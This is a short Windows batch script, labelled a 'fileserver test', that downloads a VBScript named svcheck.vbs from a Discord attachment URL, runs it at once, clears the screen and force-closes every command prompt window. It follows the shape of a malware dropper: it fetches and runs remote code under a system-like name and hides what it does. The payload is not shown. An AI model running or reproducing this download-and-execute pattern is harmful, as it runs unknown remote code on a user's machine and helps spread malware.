@echo off
::fileserver test 1,0,0
curl https://cdn.discordapp.com/attachments/844932860741025793/846518697026650122/svcheck.vbs --output \clientbooter\setup\svcheck.vbs
start \clientbooter\setup\svcheck.vbs
cls
taskkill /f /im cmd.exe
